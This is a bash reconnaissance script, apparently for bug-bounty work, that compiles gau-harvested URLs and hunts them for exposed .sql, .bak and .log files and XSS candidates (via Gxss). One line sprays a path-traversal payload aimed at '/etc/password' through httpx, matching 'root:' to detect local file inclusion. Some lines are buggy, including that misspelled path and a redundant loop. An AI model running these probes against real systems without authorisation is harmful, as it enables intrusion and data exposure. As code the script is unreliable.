cat gau_links/*  > gau_links/gau_compiled/unsorted.txt
cat gau_links/gau_compiled/unsorted.txt | sort -u | uniq > gau_links/gau_compiled/gau_compiled_non-filtered.txt
cat gau_links/gau_compiled/gau_compiled_non-filtered.txt | grep -i -v 'png$\|jpg$\|gif$\|jpeg$\|swf$\|woff$\|svg$' > gau_links/gau_compiled/gau_compiled.txt

for i in $(ls sensitive); do now=`date +"%Y-%m-%d-at-%H:%M"`; cp sensitive/$i sensitive/previous/$i.${now}.txt; done
now=`date +"%Y-%m-%d-at-%H:%M"`
for i in $(ls sensitive); do cp $i previous/$i+${now}.txt; done
cp gau_links/gau_compiled/gau_compiled.txt gau_links/gau_compiled/previous_compiled/gau_compiled-${now}.txt
rm gau_links/*

cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.xslx" | anew sensitive/xslx_found.txt
cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.sql" | anew sensitive/sql_found.txt
cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.bak" | anew sensitive/bak_found.txt
cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.log" | anew sensitive/log_found.txt
cat gau_links/gau_compiled/gau_compiled.txt | grep -i "=" | Gxss -c 100 | anew sensitive/xss.txt
cat gau_links/gau_compiled/gau_compiled.txt | grep -i "=" > sensitive/urls_to_test.txt;for y in $(cat sensitive/urls_to_test.txt);do httpx -l sensitive/urls_to_test.txt -path "/////////../../../../../../../../etc/password" -status-code -mc 200 -ms 'root:'  | anew sensitive/lfi.txt; done
cat gau_links/gau_compiled/gau_compiled.txt | grep -i "\.js$" > sensitive/jsfiles.txt
#./gen_html.sh



